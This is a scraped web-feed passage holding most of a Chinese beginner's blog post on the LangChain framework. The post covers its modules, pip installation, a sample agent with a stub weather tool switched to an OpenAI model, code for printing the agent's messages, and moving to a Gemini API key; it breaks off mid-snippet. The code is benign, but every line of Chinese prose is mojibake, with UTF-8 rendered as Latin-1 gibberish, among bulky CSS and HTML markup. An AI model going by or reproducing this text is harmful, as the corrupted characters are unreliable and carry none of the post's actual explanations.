<p>å¯ä»¥è¿™æ ·ç†è§£ï¼š<strong>MCP</strong> è§£å†³çš„æ˜¯â€œ<strong>è®© Claude è¿æ¥åˆ°å“ªé‡Œã€æ‹¿åˆ°ä»€ä¹ˆæ•°æ®</strong>â€ã€‚å¦‚æœä½ éœ€è¦ Claude <strong>å…ˆèƒ½è®¿é—®æ•°æ®åº“æˆ– Excel æ–‡ä»¶æœ¬èº«</strong>ï¼Œé‚£å°±æ˜¯ <strong>MCP</strong> çš„èŒƒç•´ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LangChain æ¡†æ¶åŸºç¡€çŸ¥è¯†å’Œæ ¸å¿ƒç»„ä»¶Promptsï¼ŒChains]]></title>    <link>https://juejin.cn/post/7595423675458240550</link>    <guid>https://juejin.cn/post/7595423675458240550</guid>    <pubDate>2026-01-15T10:10:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595423675458240550" data-draft-id="7595341943338844170" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="LangChain æ¡†æ¶åŸºç¡€çŸ¥è¯†å’Œæ ¸å¿ƒç»„ä»¶Promptsï¼ŒChains"/> <meta itemprop="keywords" content="Gemini,OpenAI,LangChain"/> <meta itemprop="datePublished" content="2026-01-15T10:10:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è‰å¸½lufei"/> <meta itemprop="url" content="https://juejin.cn/user/501033035632093"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            LangChain æ¡†æ¶åŸºç¡€çŸ¥è¯†å’Œæ ¸å¿ƒç»„ä»¶Promptsï¼ŒChains
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/501033035632093/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è‰å¸½lufei
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T10:10:12.000Z" title="Thu Jan 15 2026 10:10:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;color:#3c9dff}.markdown-body h1{font-size:30px;margin-bottom:5px;padding-bottom:8px;text-align:center}.markdown-body h2{font-size:24px;padding-bottom:6px}.markdown-body h2:before{content:"ğŸ‹"}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h3:before{content:"ğŸ“"}.markdown-body h4{font-size:16px}.markdown-body h4:before{content:"ğŸ‘"}.markdown-body h5{font-size:15px}.markdown-body h5:before{content:"ğŸ‰"}.markdown-body h6{margin-top:5px}.markdown-body h6:before{content:"ğŸ’"}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;margin:0 auto;max-width:100%;border-radius:4px;padding:1px;border:1px solid #d2e8ff}.markdown-body img:hover{box-shadow:0 1px 3px #5eaeff}.markdown-body hr{height:4px;margin:34px 0;background-size:4px 1px;background-image:linear-gradient(270deg,#5eaeff,#f3f9ff 25%,transparent 50%);border-style:none}.markdown-body code{word-break:break-word;border-radius:3px;overflow-x:auto;background-color:#d2e8ff;color:#3c9dff;font-size:.9em;padding:.1em .5em;margin:0 3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;transition:all .3s}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:1px solid #90c7ff;border-radius:4px}.markdown-body pre:hover{box-shadow:0 1px 10px #beddff}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#3c9dff;border-bottom:1px solid #90c7ff;transition:all .3s}.markdown-body a:hover{color:#007fff;border-bottom:2px solid #5eaeff}.markdown-body a[href]:not(:empty){padding-right:18px}.markdown-body a[href]:not(:empty):after{display:inline-block;width:16px;height:16px;margin-left:2px;content:"";background:url(data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxwYXRoIGQ9Ik0zODQgMTI4YTQ4IDQ4IDAgMDEyLjgxNiA5NS45MkwzODQgMjI0SDI1NmEzMiAzMiAwIDAwLTMxLjkyIDI5LjZMMjI0IDI1NnY1MTJhMzIgMzIgMCAwMDI5LjYgMzEuOTJsMi40LjA4aDUxMmEzMiAzMiAwIDAwMzEuOTItMjkuNmwuMDgtMi40VjY1NmE0OCA0OCAwIDAxOTUuOTItMi44MTZMODk2IDY1NnYxMTJhMTI4IDEyOCAwIDAxLTEyNCAxMjcuOTM2bC00IC4wNjRIMjU2YTEyOCAxMjggMCAwMS0xMjcuOTM2LTEyNGwtLjA2NC00VjI1NmExMjggMTI4IDAgMDExMjQtMTI3LjkzNmw0LS4wNjRoMTI4em0zODQgMGExMjggMTI4IDAgMDExMjcuOTM2IDEyNGwuMDY0IDR2MTYwYTQ4IDQ4IDAgMDEtOTUuOTIgMi44MTZMODAwIDQxNlYyOTEuODcybC0zODIuMDY0IDM4Mi4wOGE0OCA0OCAwIDAxLTcwLjAzMi02NS42bDIuMTYtMi4yODhMNzMyLjA5NiAyMjRINjA4YTQ4IDQ4IDAgMDEtMi44MTYtOTUuOTJMNjA4IDEyOGgxNjB6IiBmaWxsPSIjM2M5ZGZmIiBmaWxsLW9wYWNpdHk9Ii41NiIgZGF0YS1zcG0tYW5jaG9yLWlkPSJhMzEzeC5zZWFyY2hfaW5kZXguMC5pMC41Yzc1M2E4MTgwa2RKWCIgY2xhc3M9InNlbGVjdGVkIi8+PC9zdmc+);background-size:100%}.markdown-body table{margin:0 auto 10px;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border:1px solid #3c9dff}.markdown-body thead{text-align:center}.markdown-body thead th{color:#fff;background-color:#5eaeff}.markdown-body tr{text-align:center}.markdown-body tbody tr:hover{background-color:#d2e8ff}.markdown-body tbody tr:hover code{background-color:#90c7ff}.markdown-body tr:nth-child(2n){background-color:#ecf5ff}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5eaeff}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{font-weight:900;padding:0 1px;font-size:17px}.markdown-body small{color:#cbcbcb;padding:0 1px;font-size:22px;zoom:.5}.markdown-body em{padding:0 1px}.markdown-body del{padding:0 1px;text-decoration-thickness:2px}.markdown-body blockquote{color:#1a1b1c;padding:1px 20px;margin:22px 0;border-radius:4px;border-left:4px solid rgba(60,157,255,.5);background-color:rgba(190,221,255,.3)}.markdown-body blockquote blockquote{margin:8px 0}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{margin:12px 0;padding:4px 10px;border:2px solid #3c9dff;border-radius:8px;background-color:#ecf5ff;transition:all .3s}.markdown-body details summary{cursor:pointer}.markdown-body input[type=checkbox]{position:relative;appearance:none;width:16px;height:16px;border-radius:2px;vertical-align:middle;transform:translateY(-2px);box-sizing:border-box;border:1px solid #beddff}.markdown-body input[type=checkbox]:checked{border:1px solid #5eaeff;background-color:#5eaeff}.markdown-body input[type=checkbox]:checked:before{position:absolute;top:3px;left:1px;width:11px;height:6px;background-color:transparent;border-left:2px solid #fff;border-bottom:2px solid #fff;transform:rotate(-45deg);content:"";box-sizing:border-box}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>ä¹‹å‰äº†è§£åˆ°äº†AI Agent ç›¸å…³çš„ä¸€äº›åŸºç¡€æ¦‚å¿µï¼Œä¾‹å¦‚å®šä¹‰ï¼ŒLLMåŸºç¡€ï¼ŒPrompt Engineeringï¼Œä»¥åŠè°ƒ OpenAI API ç­‰ï¼Œæ¥ä¸‹æ¥å°†ä»‹ç» LangChain æ¡†æ¶çš„åŸºç¡€çŸ¥è¯†å’Œæ ¸å¿ƒç»„ä»¶</p>
<h2 data-id="heading-1">LangChain ä»‹ç»</h2>
<p>LangChain æ˜¯ä¸€ä¸ªç”¨äºæ„å»ºä»£ç†å’Œå¤§å‹è¯­è¨€æ¨¡å‹åº”ç”¨çš„æ¡†æ¶ã€‚</p>
<p>ç®€å•ç†è§£å°±æ˜¯å¯ä»¥ä½¿ç”¨ LangChain æ¡†æ¶å¿«é€Ÿå¼€å‘åŸºäºå¤§æ¨¡å‹çš„Agentå’Œåº”ç”¨ï¼Œå¯ä»¥è¿ä¸åŒAIæ¨¡å‹ä¾›åº”å•†æä¾›çš„APIï¼ŒåŒ…æ‹¬æ•°æ®åº“ã€APIã€æ–‡ä»¶ç³»ç»Ÿç­‰</p>
<h3 data-id="heading-2">ä¸»è¦æ¨¡å—</h3>
<ul>
<li><code>langchain-core</code>ï¼šæ ¸å¿ƒæŠ½è±¡å’ŒåŸºç±»</li>
<li><code>langchain-community</code>ï¼šç¤¾åŒºè´¡çŒ®çš„é›†æˆå’Œå·¥å…·</li>
<li><code>langchain-openai</code>ï¼šOpenAI æ¨¡å‹é›†æˆ</li>
<li><code>langchain-text-splitters</code>ï¼šæ–‡æœ¬åˆ†å‰²å·¥å…·</li>
<li><code>langchain-vectorstores</code>ï¼šå‘é‡å­˜å‚¨é›†æˆ</li>
</ul>
<h2 data-id="heading-3">å®˜ç½‘æ–‡æ¡£åœ°å€</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.langchain.com%2Foss%2Fpython%2Flangchain%2Foverview" target="_blank" title="https://docs.langchain.com/oss/python/langchain/overview" ref="nofollow noopener noreferrer">docs.langchain.com/oss/python/â€¦</a></p>
<h2 data-id="heading-4">å®‰è£…</h2>
<p>ç¯å¢ƒä½¿ç”¨ Python 3.10+ ç‰ˆæœ¬ï¼Œæ®è¯´ 3.10 ç‰ˆæœ¬æ˜¯æœ€ç¨³å®šçš„ç‰ˆæœ¬ï¼Œå»ºè®®ä½¿ç”¨ 3.10 ç‰ˆæœ¬</p>
<p>å®‰è£… <code>langchain</code> å’Œ <code>openai</code> åŒ…ï¼Œå¦‚æœæ˜¯å‡†å¤‡ä½¿ç”¨å…¶ä»–æ¨¡å‹ä¾›åº”å•†çš„APIï¼Œä¹Ÿéœ€è¦å®‰è£…å¯¹åº”çš„åŒ…</p>
<pre><code class="hljs language-shell" lang="shell">pip install -U langchain

pip install -U langchain-openai
</code></pre>
<h2 data-id="heading-5">æ„å»ºä¸€ä¸ªç®€å•çš„æ™ºèƒ½ä½“</h2>
<p>æ¥çœ‹ä¸‹å®˜æ–¹çš„ä¾‹å­ï¼Œå¼•å…¥ <code>create_agent</code> å‡½æ•°ï¼Œç”¨äºåˆ›å»ºä¸€ä¸ªæ™ºèƒ½ä½“ï¼Œç„¶åç»‘å®šä¸€ä¸ªå·¥å…·å‡½æ•° <code>get_weather</code>ï¼Œç”¨äºè·å–å¤©æ°”ä¿¡æ¯ï¼Œæœ€åè°ƒç”¨ <code>invoke</code> æ–¹æ³•æ¥è¿è¡Œæ™ºèƒ½ä½“</p>
<p><strong>æ³¨æ„ï¼</strong>ï¼Œè¿™ä¸ªå¤©æ°”å‡½æ•°æ˜¯ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ï¼Œå®é™…ä¸­å¯èƒ½éœ€è¦è°ƒç”¨å¤–éƒ¨çš„å¤©æ°” API æ¥è·å–çœŸå®çš„å¤©æ°”ä¿¡æ¯ï¼Œæˆ–è€…æ‰‹åŠ¨å†™ä¸ªé™æ€çš„ï¼Œè®©å®ƒè¿”å›å›ºå®šçš„å¤©æ°”ä¿¡æ¯ï¼Œèƒ½è·‘èµ·æ¥å°±è¡Œ</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain.agents <span class="hljs-keyword">import</span> create_agent

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_weather</span>(<span class="hljs-params">city: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-string">"""Get weather for a given city."""</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"It's always sunny in <span class="hljs-subst">{city}</span>!"</span>

agent = create_agent(
    model=<span class="hljs-string">"claude-sonnet-4-5-20250929"</span>,
    tools=[get_weather],
    system_prompt=<span class="hljs-string">"You are a helpful assistant"</span>,
)

<span class="hljs-comment"># Run the agent</span>
agent.invoke(
    {<span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"what is the weather in sf"</span>}]}
)
</code></pre>
<p>å®˜æ–¹çš„ç¤ºä¾‹ä½¿ç”¨çš„ Claude æ¨¡å‹ï¼Œéœ€è¦æ”¹æˆ OpenAI çš„æ¨¡å‹ï¼Œå› ä¸ºä½¿ç”¨çš„æ˜¯ OpenAI çš„ Keyï¼Œä¿®æ”¹åçš„ä»£ç å¦‚ä¸‹</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain.agents <span class="hljs-keyword">import</span> create_agent
<span class="hljs-keyword">import</span> os 
<span class="hljs-keyword">from</span> dotenv <span class="hljs-keyword">import</span> load_dotenv 
<span class="hljs-keyword">from</span> langchain_openai <span class="hljs-keyword">import</span> ChatOpenAI


<span class="hljs-comment"># åŠ è½½ç¯å¢ƒå˜é‡ </span>
load_dotenv() 

model = ChatOpenAI(
    model_name=<span class="hljs-string">"gpt-5-nano"</span>,
    api_key=os.getenv(<span class="hljs-string">"OPENAI_API_KEY"</span>),
    temperature=<span class="hljs-number">0</span>
)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_weather</span>(<span class="hljs-params">city: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-string">"""Get weather for a given city."""</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"It's always sunny in <span class="hljs-subst">{city}</span>!"</span>

agent = create_agent(
    model=model,
    tools=[get_weather],
    system_prompt=<span class="hljs-string">"You are a helpful assistant"</span>,
)

<span class="hljs-comment"># Run the agent</span>
response = agent.invoke(
    {<span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"what is the weather in sf"</span>}]}
)

<span class="hljs-comment"># æ‰“å°å®Œæ•´å“åº”</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"å®Œæ•´å“åº”:"</span>, response)

<span class="hljs-comment"># å¦‚æœå“åº”åŒ…å«ç»“æ„åŒ–è¾“å‡º</span>
<span class="hljs-keyword">if</span> <span class="hljs-string">'structured_output'</span> <span class="hljs-keyword">in</span> response:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ç»“æ„åŒ–è¾“å‡º:"</span>, response[<span class="hljs-string">'structured_output'</span>])

<span class="hljs-comment"># æˆ–è€…å¦‚æœå“åº”åŒ…å«æ¶ˆæ¯</span>
<span class="hljs-keyword">if</span> <span class="hljs-string">'messages'</span> <span class="hljs-keyword">in</span> response:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\nå®Œæ•´å¯¹è¯æµç¨‹:"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">50</span>)
    
    <span class="hljs-keyword">for</span> msg <span class="hljs-keyword">in</span> response[<span class="hljs-string">'messages'</span>]:
        <span class="hljs-comment"># æ ¹æ®æ¶ˆæ¯å¯¹è±¡ç±»å‹ç¡®å®šè§’è‰²</span>
        msg_type = <span class="hljs-built_in">type</span>(msg).__name__
        
        <span class="hljs-keyword">if</span> msg_type == <span class="hljs-string">'HumanMessage'</span>:
            role = <span class="hljs-string">'human'</span>
            content = msg.content
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ç”¨æˆ·: <span class="hljs-subst">{content}</span>"</span>)
        <span class="hljs-keyword">elif</span> msg_type == <span class="hljs-string">'AIMessage'</span>:
            role = <span class="hljs-string">'ai'</span>
            content = msg.content
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"åŠ©æ‰‹:"</span>)
            <span class="hljs-keyword">if</span> content:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  å›å¤: <span class="hljs-subst">{content}</span>"</span>)
        
            <span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦æœ‰å·¥å…·è°ƒç”¨</span>
            <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(msg, <span class="hljs-string">'tool_calls'</span>) <span class="hljs-keyword">and</span> msg.tool_calls:
                <span class="hljs-keyword">for</span> tool_call <span class="hljs-keyword">in</span> msg.tool_calls:
                    <span class="hljs-comment"># å°è¯•ä¸¤ç§æ–¹å¼è·å–å·¥å…·è°ƒç”¨ä¿¡æ¯</span>
                    <span class="hljs-keyword">try</span>:
                        <span class="hljs-comment"># å…ˆå°è¯•ä½œä¸ºå¯¹è±¡è®¿é—®</span>
                        tool_name = tool_call.name
                        tool_args = tool_call.args
                    <span class="hljs-keyword">except</span> AttributeError:
                        <span class="hljs-comment"># å¦‚æœå¤±è´¥ï¼Œå°è¯•ä½œä¸ºå­—å…¸è®¿é—®</span>
                        tool_name = tool_call.get(<span class="hljs-string">'name'</span>, <span class="hljs-string">'unknown_tool'</span>)
                        tool_args = tool_call.get(<span class="hljs-string">'args'</span>, {})
                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  å·¥å…·è°ƒç”¨: <span class="hljs-subst">{tool_name}</span>"</span>)
                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  å‚æ•°: <span class="hljs-subst">{tool_args}</span>"</span>)
        <span class="hljs-keyword">elif</span> msg_type == <span class="hljs-string">'ToolMessage'</span>:
            role = <span class="hljs-string">'tool'</span>
            content = msg.content
            <span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦æœ‰å·¥å…·åç§°</span>
            tool_name = <span class="hljs-built_in">getattr</span>(msg, <span class="hljs-string">'name'</span>, <span class="hljs-string">'æœªçŸ¥å·¥å…·'</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å·¥å…· <span class="hljs-subst">{tool_name}</span> ç»“æœ: <span class="hljs-subst">{content}</span>"</span>)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># å¤„ç†å…¶ä»–ç±»å‹çš„æ¶ˆæ¯</span>
            content = msg.content <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(msg, <span class="hljs-string">'content'</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">str</span>(msg)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{msg_type}</span>: <span class="hljs-subst">{content}</span>"</span>)
        
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">50</span>)
</code></pre>
<p>è¿è¡Œåçš„æ•ˆæœå¦‚ä¸‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a6c17ac6b594a5a9588072e50aa3da1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769076612&amp;x-signature=%2FHlQ6P9sFqWf8Y9rsu4AXgiJB4c%3D" alt="" loading="lazy"/></p>
<p>é‡ç‚¹æ”¹åŠ¨æ˜¯è¾“å‡ºï¼Œå› ä¸º <code>agent.invoke</code> è¿è¡Œåï¼Œå°±å®Œäº†ï¼Œæ²¡æœ‰ä»»ä½•è¾“å‡º</p>
<pre><code class="hljs language-python" lang="python">response = agent.invoke(
    {<span class="hljs-string">"messages"</span>: [{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"what is the weather in sf"</span>}]}
)
</code></pre>
<p>å¼€å§‹æˆ‘è¿˜ä»¥ä¸ºæ²¡è¿è¡ŒæˆåŠŸï¼Œåæ¥æœä¸€ä¸‹æ‰çŸ¥é“ï¼Œéœ€è¦å•ç‹¬æ‰“å°å®Œæ•´å“åº”ï¼Œæ ¼å¼åŒ–å¤„ç†æ‰èƒ½çœ‹åˆ°æƒ³è¦çš„è¾“å‡ºï¼Œå‰ç«¯é€‰æ‰‹ç›´æ¥ç”¨Pythonè¿è¡Œä»£ç å­¦ä¹ çš„å¿…çˆ¬ä¹‹å‘</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a7812a8a3c34da8bfdd4aafea51e854~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769076612&amp;x-signature=zsBKWZ8Nogr1r07YZfZP%2B8K%2BFrA%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>ä¸ºä»€ä¹ˆç”¨Python,ä¸ç›´æ¥ç”¨TSä¹‹ç±»çš„å»å­¦ä¹  LangChain æ¡†æ¶ï¼Ÿ</p>
<p>å› ä¸ºAIç›¸å…³çš„Pythonç”Ÿæ€æ˜¯æœ€å®Œå–„çš„ï¼Œå…¶ä»–è¯­è¨€ä¹Ÿæœ‰ï¼Œä½†æ˜¯æ²¡æœ‰Pythonçš„ç”Ÿæ€å®Œå–„ï¼Œè¿˜æœ‰ä¸€ä¸ªé‡è¦åŸå› æ˜¯ï¼Œå‰ç«¯å²—ä½å·²ç»è¦æ— äº†ï¼Œç›´æ¥ç”¨Pythonè½¬åç«¯æˆ–å…¨æ ˆï¼Œè‡ªå·±å¯èƒ½è¿˜èƒ½æœ‰ä¸€ç‚¹ç‚¹ç«äº‰åŠ›</p>
</blockquote>
<h2 data-id="heading-6">æ¢Keyç»§ç»­</h2>
<p>å› ä¸º OpenAI çš„å…è´¹è´¦å·ç”³è¯·çš„ Key æ˜¯æœ‰è°ƒç”¨æ¬¡æ•°é™åˆ¶å’Œé¢‘ç‡é™åˆ¶ï¼Œå¯¼è‡´æˆ‘åœ¨è°ƒè¯•çš„æ—¶å€™ï¼Œå‡ºç°äº†æŠ¥é”™çš„æƒ…å†µï¼Œæœäº†ä¸€ä¸‹æ˜¯ Key è°ƒç”¨æ¬¡æ•°å¤šäº†ï¼Œç„¶åè¢«é™åˆ¶äº†ï¼Œè¿™æ˜¯é—®çš„ Google å…·ä½“æè¿°å¦‚ä¸‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d4081d290584ce9a106f08b3cb54af8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769076612&amp;x-signature=DvspKrjuLazjJIwSN3uO9sJLqGg%3D" alt="" loading="lazy"/></p>
<p>ç„¶åå®ƒæåˆ°äº†ï¼ŒGoogle AI Studio(Gemini API) æä¾›æ¯å¤©é«˜è¾¾ 1500 æ¬¡çš„å…è´¹è°ƒç”¨é¢åº¦ï¼Œå“‡å“¦ï¼ŒGoogle å¯çœŸæ˜¯å¤ªè±ªäº†</p>
<p>è¿˜ç­‰ä»€ä¹ˆï¼Œæœæ–­ç”³è¯·ä¸€ä¸ª Gemini API Key ç»§ç»­å­¦ä¹ </p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4c60cb7953274cd1a2dc4f42b4a70d36~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769076612&amp;x-signature=y9jVbzB7vDmLtqBwJHMeSsq8VP4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-7">Gemini API Key é…ç½®</h2>
<p>åœ¨ .env æ–‡ä»¶ä¸­æ·»åŠ  Gemini API Key</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eeb3251c8c134be2af94ce9e77f376f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769076612&amp;x-signature=qW8n6qIJEE0bMWXB2O0OepSsNLo%3D" alt="" loading="lazy"/></p>
<pre><code class="hljs language-shell" lang="shell">GEMINI_API_KEY=your_gemini_api_key
</code></pre>
<p>å®‰è£… Google GenAI SDK</p>
<pre><code class="hljs language-shell" lang="shell">pip install -q -U google-genai
</code></pre>
<p>é‡æ–°åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œæ¢ä¸Š Gemini API Key æµ‹è¯•ä¸€ä¸‹è¯·æ±‚ï¼Œå¦‚æœç»ˆç«¯æ­£ç¡®è¾“å‡ºè¯´æ˜é…ç½®æˆåŠŸ</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> google <span class="hljs-keyword">import</span> genai
<span class="hljs-keyword">import</span> os 
